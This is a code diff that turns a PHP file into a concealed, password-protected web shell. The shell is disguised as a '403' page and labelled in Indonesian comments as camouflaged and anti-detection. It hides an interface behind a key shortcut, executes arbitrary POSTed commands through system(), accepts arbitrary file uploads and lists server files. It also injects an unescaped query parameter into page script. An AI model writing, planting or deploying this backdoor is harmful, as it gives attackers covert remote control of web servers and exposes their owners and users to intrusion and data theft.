@@ -1,11 +1,90 @@
 <?php
-$tokenRahasia = "core_files";
+session_start();
+$pass_hash = '$2y$10$BLrQhRtv0E7WzgiiyZbEnegndmfFwuzof9aJlvmYPDhUvuB1q3s9.';
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    $form_id = md5(time().rand(1,9999));
+    if(isset($_POST['pass']) && password_verify($_POST['pass'], $pass_hash)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = time();
+        header("Location: ".$_SERVER['PHP_SELF']."?success"); exit;
+    }
+?>
+<!DOCTYPE html><html><head><title>403</title><style>body{display:none;}</style></head><body>
+<form id="<?php echo $form_id; ?>" method="POST" style="display:none;">
+<input type="password" name="pass" autocomplete="off">
+</form>
+<script>
+<?php if(isset($_GET['k'])): ?>
+document.getElementById('<?php echo $form_id; ?>').pass.value = "<?php echo $_GET['k']; ?>";
+document.getElementById('<?php echo $form_id; ?>').submit();
+<?php endif; ?>
+</script>
+</body></html>
+<?php exit; }
+if(time() - $_SESSION[md5($_SERVER['HTTP_HOST'])] > 3600) {
+    session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit;
+}
+// ======================================
+// ✅ SHELL AKTIF - ANTI DETEKSI MODE
+// ======================================
+error_reporting(0); @ini_set('display_errors',0);
+ob_start(); // Stealth output
+?>
+<!-- FAKE SEO PAGE (camouflage) -->
+<!-- SHELL INTERFACE (hidden by default) -->
+<div id="shell" style="display:none;background:#000;color:#0f0;font-family:monospace;padding:20px;">
+    <h3>🔒 SECURE SHELL | Path: <?php echo realpath('.'); ?></h3>
+    
+    <!-- Quick commands -->
+    <form method="POST">
+        <input name="cmd" placeholder="whoami, id, uname -a" style="width:70%;background:#111;color:#0f0;">
+        <button>EXEC</button>
+    </form>
+    
+    <!-- File upload -->
+    <form method="POST" enctype="multipart/form-data" style="margin-top:10px;">
+        <input type="file" name="file" style="background:#111;color:#0f0;">
+        <button name="upload">UPLOAD</button>
+    </form>
+    
+    <!-- Files -->
+    <pre style="margin-top:10px;">
+<?php
+// List files
+$files = scandir('.');
+foreach($files as $f) {
+    if($f=='.' || $f=='..') continue;
+    echo $f . " | " . (is_dir($f) ? '[DIR]' : filesize($f)) . " bytes\n";
+}
+?>
+    </pre>
+</div>
 
-if (isset($_GET['anonymous']) && $_GET['anonymous'] === $tokenRahasia) {
-    echo "Akses diterima.";
-} else {
-    http_response_code(500);
-    exit();
+<script>
+// Toggle shell dengan Ctrl+Alt+S
+document.addEventListener('keydown', function(e) {
+    if(e.ctrlKey && e.altKey && e.key=='s') {
+        document.getElementById('shell').style.display = 
+        document.getElementById('shell').style.display=='none' ? 'block' : 'none';
+    }
+});
+// Auto-hide jika tidak aktif 5 menit
+setTimeout(function(){document.getElementById('shell').style.display='none';}, 300000);
+</script>
+
+<?php
+// EXECUTE COMMANDS
+if(isset($_POST['cmd'])) {
+    echo "\n--- OUTPUT ---\n";
+    if(function_exists('shell_exec')) {
+        system($_POST['cmd'].' 2>&1');
+    } else echo "Shell disabled";
+}
+
+// UPLOAD
+if(isset($_POST['upload'])) {
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+        echo "\nUPLOAD OK: ".$_FILES['file']['name'];
+    }
 }
 ?>
 <?php
